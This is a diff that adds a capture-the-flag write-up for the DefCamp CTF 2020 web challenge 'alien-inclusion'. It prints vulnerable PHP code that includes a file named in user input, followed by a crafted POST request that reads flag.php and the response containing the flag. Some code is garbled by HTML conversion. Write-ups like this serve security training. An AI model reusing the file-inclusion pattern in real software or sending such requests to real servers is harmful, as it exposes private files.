@@ -1,0 +1,61 @@
+<h1>DefCamp CTF 2020 – alien-inclusion</h1>
+
+<ul>
+<li><strong>Category:</strong> web</li>
+<li><strong>Points:</strong> 50</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>Keep it local and you should be fine. The flag is in /var/www/html/flag.php.</p>
+  
+  <p>Flag format: CTF{sha256}</p>
+  
+  <p>The challenge was proposed by BIT SENTINEL.</p>
+  
+  <p>35.234.65.24:30627</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>The challenge will print a PHP source code.</p>
+
+<p>```php
+<?php</p>
+
+<p>if (!isset($<em>GET['start'])){
+    show</em>source(<strong>FILE</strong>);
+    exit;
+} </p>
+
+<p>include ($_POST['start']);
+echo $secret;
+```</p>
+
+<p>You can craft a request like the following.</p>
+
+<p>```
+POST /?start=/var/www/html/flag.php HTTP/1.1
+Host: 35.234.65.24:30627
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 28
+Content-Type: application/x-www-form-urlencoded</p>
+
+<p>start=/var/www/html/flag.php</p>
+
+<p>HTTP/1.1 200 OK
+Date: Sat, 05 Dec 2020 12:55:40 GMT
+Server: Apache
+Vary: Accept-Encoding
+Content-Length: 69
+Connection: close
+Content-Type: text/html; charset=UTF-8</p>
+
+<p>ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}
+```</p>
